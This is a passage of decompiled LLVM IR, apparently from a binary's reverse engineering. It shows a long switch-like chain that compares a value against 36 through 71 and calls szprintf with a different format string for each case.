  %v8_b0ac = call i32 @szprintf(i32 %v2_b088, i32 ptrtoint ([12 x i8]* @global_var_201dc.144 to i32), i32 %v4_b0ac, i32 %v6_b0ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0b0

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b07c, %dec_label_pc_b088
  %v7_b0b4 = icmp eq i32 %v2_a93c, 36
  br i1 %v7_b0b4, label %dec_label_pc_b0bc, label %dec_label_pc_b0e4

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0b0
  %v2_b0bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0c8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b0d4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b0e0 = sext i8 %v3_b0c8 to i32
  %v6_b0e0 = sext i8 %v3_b0d4 to i32
  %v8_b0e0 = call i32 @szprintf(i32 %v2_b0bc, i32 ptrtoint ([12 x i8]* @global_var_201e8.146 to i32), i32 %v4_b0e0, i32 %v6_b0e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0e4

dec_label_pc_b0e4:                                ; preds = %dec_label_pc_b0b0, %dec_label_pc_b0bc
  %v7_b0e8 = icmp eq i32 %v2_a93c, 37
  br i1 %v7_b0e8, label %dec_label_pc_b0f0, label %dec_label_pc_b118

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_b0e4
  %v2_b0f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0fc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b108 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b114 = sext i8 %v3_b0fc to i32
  %v6_b114 = sext i8 %v3_b108 to i32
  %v8_b114 = call i32 @szprintf(i32 %v2_b0f0, i32 ptrtoint ([12 x i8]* @global_var_201f4.148 to i32), i32 %v4_b114, i32 %v6_b114, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b0e4, %dec_label_pc_b0f0
  %v7_b11c = icmp eq i32 %v2_a93c, 38
  br i1 %v7_b11c, label %dec_label_pc_b124, label %dec_label_pc_b14c

dec_label_pc_b124:                                ; preds = %dec_label_pc_b118
  %v2_b124 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b130 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b13c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b148 = sext i8 %v3_b130 to i32
  %v6_b148 = sext i8 %v3_b13c to i32
  %v8_b148 = call i32 @szprintf(i32 %v2_b124, i32 ptrtoint ([13 x i8]* @global_var_20200.150 to i32), i32 %v4_b148, i32 %v6_b148, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b118, %dec_label_pc_b124
  %v7_b150 = icmp eq i32 %v2_a93c, 39
  br i1 %v7_b150, label %dec_label_pc_b158, label %dec_label_pc_b180

dec_label_pc_b158:                                ; preds = %dec_label_pc_b14c
  %v2_b158 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b164 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b170 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b17c = sext i8 %v3_b164 to i32
  %v6_b17c = sext i8 %v3_b170 to i32
  %v8_b17c = call i32 @szprintf(i32 %v2_b158, i32 ptrtoint ([13 x i8]* @global_var_20210.152 to i32), i32 %v4_b17c, i32 %v6_b17c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b180

dec_label_pc_b180:                                ; preds = %dec_label_pc_b14c, %dec_label_pc_b158
  %v7_b184 = icmp eq i32 %v2_a93c, 40
  br i1 %v7_b184, label %dec_label_pc_b18c, label %dec_label_pc_b1b4

dec_label_pc_b18c:                                ; preds = %dec_label_pc_b180
  %v2_b18c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b198 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b1a4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b1b0 = sext i8 %v3_b198 to i32
  %v6_b1b0 = sext i8 %v3_b1a4 to i32
  %v8_b1b0 = call i32 @szprintf(i32 %v2_b18c, i32 ptrtoint ([13 x i8]* @global_var_20200.150 to i32), i32 %v4_b1b0, i32 %v6_b1b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1b4

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b180, %dec_label_pc_b18c
  %v7_b1b8 = icmp eq i32 %v2_a93c, 41
  br i1 %v7_b1b8, label %dec_label_pc_b1c0, label %dec_label_pc_b1e8

dec_label_pc_b1c0:                                ; preds = %dec_label_pc_b1b4
  %v2_b1c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1cc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b1d8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b1e4 = sext i8 %v3_b1cc to i32
  %v6_b1e4 = sext i8 %v3_b1d8 to i32
  %v8_b1e4 = call i32 @szprintf(i32 %v2_b1c0, i32 ptrtoint ([13 x i8]* @global_var_20220.154 to i32), i32 %v4_b1e4, i32 %v6_b1e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1b4, %dec_label_pc_b1c0
  %v7_b1ec = icmp eq i32 %v2_a93c, 42
  br i1 %v7_b1ec, label %dec_label_pc_b1f4, label %dec_label_pc_b21c

dec_label_pc_b1f4:                                ; preds = %dec_label_pc_b1e8
  %v2_b1f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b200 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b20c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b218 = sext i8 %v3_b200 to i32
  %v6_b218 = sext i8 %v3_b20c to i32
  %v8_b218 = call i32 @szprintf(i32 %v2_b1f4, i32 ptrtoint ([13 x i8]* @global_var_20230.156 to i32), i32 %v4_b218, i32 %v6_b218, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b21c

dec_label_pc_b21c:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b1f4
  %v7_b220 = icmp eq i32 %v2_a93c, 43
  br i1 %v7_b220, label %dec_label_pc_b228, label %dec_label_pc_b250

dec_label_pc_b228:                                ; preds = %dec_label_pc_b21c
  %v2_b228 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b234 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b240 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b24c = sext i8 %v3_b234 to i32
  %v6_b24c = sext i8 %v3_b240 to i32
  %v8_b24c = call i32 @szprintf(i32 %v2_b228, i32 ptrtoint ([13 x i8]* @global_var_20240.158 to i32), i32 %v4_b24c, i32 %v6_b24c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b250

dec_label_pc_b250:                                ; preds = %dec_label_pc_b21c, %dec_label_pc_b228
  %v7_b254 = icmp eq i32 %v2_a93c, 44
  br i1 %v7_b254, label %dec_label_pc_b25c, label %dec_label_pc_b284

dec_label_pc_b25c:                                ; preds = %dec_label_pc_b250
  %v2_b25c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b268 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b274 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b280 = sext i8 %v3_b268 to i32
  %v6_b280 = sext i8 %v3_b274 to i32
  %v8_b280 = call i32 @szprintf(i32 %v2_b25c, i32 ptrtoint ([13 x i8]* @global_var_20230.156 to i32), i32 %v4_b280, i32 %v6_b280, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b284

dec_label_pc_b284:                                ; preds = %dec_label_pc_b250, %dec_label_pc_b25c
  %v7_b288 = icmp eq i32 %v2_a93c, 45
  br i1 %v7_b288, label %dec_label_pc_b290, label %dec_label_pc_b2b8

dec_label_pc_b290:                                ; preds = %dec_label_pc_b284
  %v2_b290 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b29c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b2a8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b2b4 = sext i8 %v3_b29c to i32
  %v6_b2b4 = sext i8 %v3_b2a8 to i32
  %v8_b2b4 = call i32 @szprintf(i32 %v2_b290, i32 ptrtoint ([13 x i8]* @global_var_20250.160 to i32), i32 %v4_b2b4, i32 %v6_b2b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b8

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b284, %dec_label_pc_b290
  %v7_b2bc = icmp eq i32 %v2_a93c, 46
  br i1 %v7_b2bc, label %dec_label_pc_b2c4, label %dec_label_pc_b2ec

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b2b8
  %v2_b2c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2d0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b2dc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b2e8 = sext i8 %v3_b2d0 to i32
  %v6_b2e8 = sext i8 %v3_b2dc to i32
  %v8_b2e8 = call i32 @szprintf(i32 %v2_b2c4, i32 ptrtoint ([13 x i8]* @global_var_20260.162 to i32), i32 %v4_b2e8, i32 %v6_b2e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2ec

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b2b8, %dec_label_pc_b2c4
  %v7_b2f0 = icmp eq i32 %v2_a93c, 47
  br i1 %v7_b2f0, label %dec_label_pc_b2f8, label %dec_label_pc_b320

dec_label_pc_b2f8:                                ; preds = %dec_label_pc_b2ec
  %v2_b2f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b304 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b310 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b31c = sext i8 %v3_b304 to i32
  %v6_b31c = sext i8 %v3_b310 to i32
  %v8_b31c = call i32 @szprintf(i32 %v2_b2f8, i32 ptrtoint ([13 x i8]* @global_var_20270.164 to i32), i32 %v4_b31c, i32 %v6_b31c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b320

dec_label_pc_b320:                                ; preds = %dec_label_pc_b2ec, %dec_label_pc_b2f8
  %v7_b324 = icmp eq i32 %v2_a93c, 48
  br i1 %v7_b324, label %dec_label_pc_b32c, label %dec_label_pc_b354

dec_label_pc_b32c:                                ; preds = %dec_label_pc_b320
  %v2_b32c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b338 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b344 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b350 = sext i8 %v3_b338 to i32
  %v6_b350 = sext i8 %v3_b344 to i32
  %v8_b350 = call i32 @szprintf(i32 %v2_b32c, i32 ptrtoint ([13 x i8]* @global_var_20280.166 to i32), i32 %v4_b350, i32 %v6_b350, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b354

dec_label_pc_b354:                                ; preds = %dec_label_pc_b320, %dec_label_pc_b32c
  %v7_b358 = icmp eq i32 %v2_a93c, 49
  br i1 %v7_b358, label %dec_label_pc_b360, label %dec_label_pc_b388

dec_label_pc_b360:                                ; preds = %dec_label_pc_b354
  %v2_b360 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b36c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b378 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b384 = sext i8 %v3_b36c to i32
  %v6_b384 = sext i8 %v3_b378 to i32
  %v8_b384 = call i32 @szprintf(i32 %v2_b360, i32 ptrtoint ([13 x i8]* @global_var_20290.168 to i32), i32 %v4_b384, i32 %v6_b384, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b388

dec_label_pc_b388:                                ; preds = %dec_label_pc_b354, %dec_label_pc_b360
  %v7_b38c = icmp eq i32 %v2_a93c, 50
  br i1 %v7_b38c, label %dec_label_pc_b394, label %dec_label_pc_b3bc

dec_label_pc_b394:                                ; preds = %dec_label_pc_b388
  %v2_b394 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3a0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b3ac = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b3b8 = sext i8 %v3_b3a0 to i32
  %v6_b3b8 = sext i8 %v3_b3ac to i32
  %v8_b3b8 = call i32 @szprintf(i32 %v2_b394, i32 ptrtoint ([13 x i8]* @global_var_202a0.170 to i32), i32 %v4_b3b8, i32 %v6_b3b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3bc

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b388, %dec_label_pc_b394
  %v7_b3c0 = icmp eq i32 %v2_a93c, 51
  br i1 %v7_b3c0, label %dec_label_pc_b3c8, label %dec_label_pc_b3f0

dec_label_pc_b3c8:                                ; preds = %dec_label_pc_b3bc
  %v2_b3c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3d4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b3e0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b3ec = sext i8 %v3_b3d4 to i32
  %v6_b3ec = sext i8 %v3_b3e0 to i32
  %v8_b3ec = call i32 @szprintf(i32 %v2_b3c8, i32 ptrtoint ([14 x i8]* @global_var_202b0.172 to i32), i32 %v4_b3ec, i32 %v6_b3ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3f0

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3bc, %dec_label_pc_b3c8
  %v7_b3f4 = icmp eq i32 %v2_a93c, 52
  br i1 %v7_b3f4, label %dec_label_pc_b3fc, label %dec_label_pc_b424

dec_label_pc_b3fc:                                ; preds = %dec_label_pc_b3f0
  %v2_b3fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b408 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b414 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b420 = sext i8 %v3_b408 to i32
  %v6_b420 = sext i8 %v3_b414 to i32
  %v8_b420 = call i32 @szprintf(i32 %v2_b3fc, i32 ptrtoint ([13 x i8]* @global_var_202c0.174 to i32), i32 %v4_b420, i32 %v6_b420, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b3f0, %dec_label_pc_b3fc
  %v7_b428 = icmp eq i32 %v2_a93c, 53
  br i1 %v7_b428, label %dec_label_pc_b430, label %dec_label_pc_b458

dec_label_pc_b430:                                ; preds = %dec_label_pc_b424
  %v2_b430 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b43c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b448 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b454 = sext i8 %v3_b43c to i32
  %v6_b454 = sext i8 %v3_b448 to i32
  %v8_b454 = call i32 @szprintf(i32 %v2_b430, i32 ptrtoint ([14 x i8]* @global_var_202d0.176 to i32), i32 %v4_b454, i32 %v6_b454, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b458

dec_label_pc_b458:                                ; preds = %dec_label_pc_b424, %dec_label_pc_b430
  %v7_b45c = icmp eq i32 %v2_a93c, 54
  br i1 %v7_b45c, label %dec_label_pc_b464, label %dec_label_pc_b48c

dec_label_pc_b464:                                ; preds = %dec_label_pc_b458
  %v2_b464 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b470 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b47c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b488 = sext i8 %v3_b470 to i32
  %v6_b488 = sext i8 %v3_b47c to i32
  %v8_b488 = call i32 @szprintf(i32 %v2_b464, i32 ptrtoint ([13 x i8]* @global_var_202e0.178 to i32), i32 %v4_b488, i32 %v6_b488, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b458, %dec_label_pc_b464
  %v7_b490 = icmp eq i32 %v2_a93c, 55
  br i1 %v7_b490, label %dec_label_pc_b498, label %dec_label_pc_b4c0

dec_label_pc_b498:                                ; preds = %dec_label_pc_b48c
  %v2_b498 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4a4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b4b0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b4bc = sext i8 %v3_b4a4 to i32
  %v6_b4bc = sext i8 %v3_b4b0 to i32
  %v8_b4bc = call i32 @szprintf(i32 %v2_b498, i32 ptrtoint ([14 x i8]* @global_var_202f0.180 to i32), i32 %v4_b4bc, i32 %v6_b4bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b48c, %dec_label_pc_b498
  %v7_b4c4 = icmp eq i32 %v2_a93c, 56
  br i1 %v7_b4c4, label %dec_label_pc_b4cc, label %dec_label_pc_b4f4

dec_label_pc_b4cc:                                ; preds = %dec_label_pc_b4c0
  %v2_b4cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4d8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b4e4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b4f0 = sext i8 %v3_b4d8 to i32
  %v6_b4f0 = sext i8 %v3_b4e4 to i32
  %v8_b4f0 = call i32 @szprintf(i32 %v2_b4cc, i32 ptrtoint ([14 x i8]* @global_var_20300.182 to i32), i32 %v4_b4f0, i32 %v6_b4f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b4c0, %dec_label_pc_b4cc
  %v7_b4f8 = icmp eq i32 %v2_a93c, 57
  br i1 %v7_b4f8, label %dec_label_pc_b500, label %dec_label_pc_b528

dec_label_pc_b500:                                ; preds = %dec_label_pc_b4f4
  %v2_b500 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b50c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b518 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b524 = sext i8 %v3_b50c to i32
  %v6_b524 = sext i8 %v3_b518 to i32
  %v8_b524 = call i32 @szprintf(i32 %v2_b500, i32 ptrtoint ([13 x i8]* @global_var_20310.184 to i32), i32 %v4_b524, i32 %v6_b524, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b528

dec_label_pc_b528:                                ; preds = %dec_label_pc_b4f4, %dec_label_pc_b500
  %v7_b52c = icmp eq i32 %v2_a93c, 58
  br i1 %v7_b52c, label %dec_label_pc_b534, label %dec_label_pc_b55c

dec_label_pc_b534:                                ; preds = %dec_label_pc_b528
  %v2_b534 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b540 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b54c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b558 = sext i8 %v3_b540 to i32
  %v6_b558 = sext i8 %v3_b54c to i32
  %v8_b558 = call i32 @szprintf(i32 %v2_b534, i32 ptrtoint ([13 x i8]* @global_var_20320.186 to i32), i32 %v4_b558, i32 %v6_b558, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b55c

dec_label_pc_b55c:                                ; preds = %dec_label_pc_b528, %dec_label_pc_b534
  %v7_b560 = icmp eq i32 %v2_a93c, 59
  br i1 %v7_b560, label %dec_label_pc_b568, label %dec_label_pc_b590

dec_label_pc_b568:                                ; preds = %dec_label_pc_b55c
  %v2_b568 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b574 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b580 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b58c = sext i8 %v3_b574 to i32
  %v6_b58c = sext i8 %v3_b580 to i32
  %v8_b58c = call i32 @szprintf(i32 %v2_b568, i32 ptrtoint ([13 x i8]* @global_var_20330.188 to i32), i32 %v4_b58c, i32 %v6_b58c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b590

dec_label_pc_b590:                                ; preds = %dec_label_pc_b55c, %dec_label_pc_b568
  %v7_b594 = icmp eq i32 %v2_a93c, 60
  br i1 %v7_b594, label %dec_label_pc_b59c, label %dec_label_pc_b5c4

dec_label_pc_b59c:                                ; preds = %dec_label_pc_b590
  %v2_b59c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5a8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b5b4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b5c0 = sext i8 %v3_b5a8 to i32
  %v6_b5c0 = sext i8 %v3_b5b4 to i32
  %v8_b5c0 = call i32 @szprintf(i32 %v2_b59c, i32 ptrtoint ([13 x i8]* @global_var_20340.190 to i32), i32 %v4_b5c0, i32 %v6_b5c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5c4

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b590, %dec_label_pc_b59c
  %v7_b5c8 = icmp eq i32 %v2_a93c, 61
  br i1 %v7_b5c8, label %dec_label_pc_b5d0, label %dec_label_pc_b5f8

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5c4
  %v2_b5d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5dc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b5e8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b5f4 = sext i8 %v3_b5dc to i32
  %v6_b5f4 = sext i8 %v3_b5e8 to i32
  %v8_b5f4 = call i32 @szprintf(i32 %v2_b5d0, i32 ptrtoint ([13 x i8]* @global_var_20350.192 to i32), i32 %v4_b5f4, i32 %v6_b5f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5c4, %dec_label_pc_b5d0
  %v7_b5fc = icmp eq i32 %v2_a93c, 62
  br i1 %v7_b5fc, label %dec_label_pc_b604, label %dec_label_pc_b62c

dec_label_pc_b604:                                ; preds = %dec_label_pc_b5f8
  %v2_b604 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b610 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b61c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b628 = sext i8 %v3_b610 to i32
  %v6_b628 = sext i8 %v3_b61c to i32
  %v8_b628 = call i32 @szprintf(i32 %v2_b604, i32 ptrtoint ([13 x i8]* @global_var_20360.194 to i32), i32 %v4_b628, i32 %v6_b628, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b62c

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b5f8, %dec_label_pc_b604
  %v7_b630 = icmp eq i32 %v2_a93c, 63
  br i1 %v7_b630, label %dec_label_pc_b638, label %dec_label_pc_b660

dec_label_pc_b638:                                ; preds = %dec_label_pc_b62c
  %v2_b638 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b644 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b650 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b65c = sext i8 %v3_b644 to i32
  %v6_b65c = sext i8 %v3_b650 to i32
  %v8_b65c = call i32 @szprintf(i32 %v2_b638, i32 ptrtoint ([13 x i8]* @global_var_20370.196 to i32), i32 %v4_b65c, i32 %v6_b65c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b660

dec_label_pc_b660:                                ; preds = %dec_label_pc_b62c, %dec_label_pc_b638
  %v7_b664 = icmp eq i32 %v2_a93c, 64
  br i1 %v7_b664, label %dec_label_pc_b66c, label %dec_label_pc_b694

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b660
  %v2_b66c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b678 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b684 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b690 = sext i8 %v3_b678 to i32
  %v6_b690 = sext i8 %v3_b684 to i32
  %v8_b690 = call i32 @szprintf(i32 %v2_b66c, i32 ptrtoint ([13 x i8]* @global_var_20380.198 to i32), i32 %v4_b690, i32 %v6_b690, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b694

dec_label_pc_b694:                                ; preds = %dec_label_pc_b660, %dec_label_pc_b66c
  %v7_b698 = icmp eq i32 %v2_a93c, 65
  br i1 %v7_b698, label %dec_label_pc_b6a0, label %dec_label_pc_b6c8

dec_label_pc_b6a0:                                ; preds = %dec_label_pc_b694
  %v2_b6a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6ac = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b6b8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b6c4 = sext i8 %v3_b6ac to i32
  %v6_b6c4 = sext i8 %v3_b6b8 to i32
  %v8_b6c4 = call i32 @szprintf(i32 %v2_b6a0, i32 ptrtoint ([13 x i8]* @global_var_20390.200 to i32), i32 %v4_b6c4, i32 %v6_b6c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c8

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b694, %dec_label_pc_b6a0
  %v7_b6cc = icmp eq i32 %v2_a93c, 66
  br i1 %v7_b6cc, label %dec_label_pc_b6d4, label %dec_label_pc_b6fc

dec_label_pc_b6d4:                                ; preds = %dec_label_pc_b6c8
  %v2_b6d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6e0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b6ec = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b6f8 = sext i8 %v3_b6e0 to i32
  %v6_b6f8 = sext i8 %v3_b6ec to i32
  %v8_b6f8 = call i32 @szprintf(i32 %v2_b6d4, i32 ptrtoint ([13 x i8]* @global_var_203a0.202 to i32), i32 %v4_b6f8, i32 %v6_b6f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6c8, %dec_label_pc_b6d4
  %v7_b700 = icmp eq i32 %v2_a93c, 67
  br i1 %v7_b700, label %dec_label_pc_b708, label %dec_label_pc_b730

dec_label_pc_b708:                                ; preds = %dec_label_pc_b6fc
  %v2_b708 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b714 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b720 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b72c = sext i8 %v3_b714 to i32
  %v6_b72c = sext i8 %v3_b720 to i32
  %v8_b72c = call i32 @szprintf(i32 %v2_b708, i32 ptrtoint ([13 x i8]* @global_var_203b0.204 to i32), i32 %v4_b72c, i32 %v6_b72c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b730

dec_label_pc_b730:                                ; preds = %dec_label_pc_b6fc, %dec_label_pc_b708
  %v7_b734 = icmp eq i32 %v2_a93c, 68
  br i1 %v7_b734, label %dec_label_pc_b73c, label %dec_label_pc_b764

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b730
  %v2_b73c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b748 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b754 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b760 = sext i8 %v3_b748 to i32
  %v6_b760 = sext i8 %v3_b754 to i32
  %v8_b760 = call i32 @szprintf(i32 %v2_b73c, i32 ptrtoint ([13 x i8]* @global_var_203c0.206 to i32), i32 %v4_b760, i32 %v6_b760, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b730, %dec_label_pc_b73c
  %v7_b768 = icmp eq i32 %v2_a93c, 69
  br i1 %v7_b768, label %dec_label_pc_b770, label %dec_label_pc_b9e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b764
  %v2_b770 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b77c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b788 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b794 = sext i8 %v3_b77c to i32
  %v6_b794 = sext i8 %v3_b788 to i32
  %v8_b794 = call i32 @szprintf(i32 %v2_b770, i32 ptrtoint ([13 x i8]* @global_var_203d0.208 to i32), i32 %v4_b794, i32 %v6_b794, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b770
  %v7_b9e8 = icmp eq i32 %v2_a93c, 70
  br i1 %v7_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_ba18

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9e4
  %v2_b9f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9fc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ba08 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ba14 = sext i8 %v3_b9fc to i32
  %v6_ba14 = sext i8 %v3_ba08 to i32
  %v8_ba14 = call i32 @szprintf(i32 %v2_b9f0, i32 ptrtoint ([13 x i8]* @global_var_203e0.210 to i32), i32 %v4_ba14, i32 %v6_ba14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9e4, %dec_label_pc_b9f0
  %v7_ba1c = icmp eq i32 %v2_a93c, 71
  br i1 %v7_ba1c, label %dec_label_pc_ba24, label %dec_label_pc_ba4c

dec_label_pc_ba24:                                ; preds = %dec_label_pc_ba18
  %v2_ba24 = ptrtoint i32* %stack_var_-36 to i32
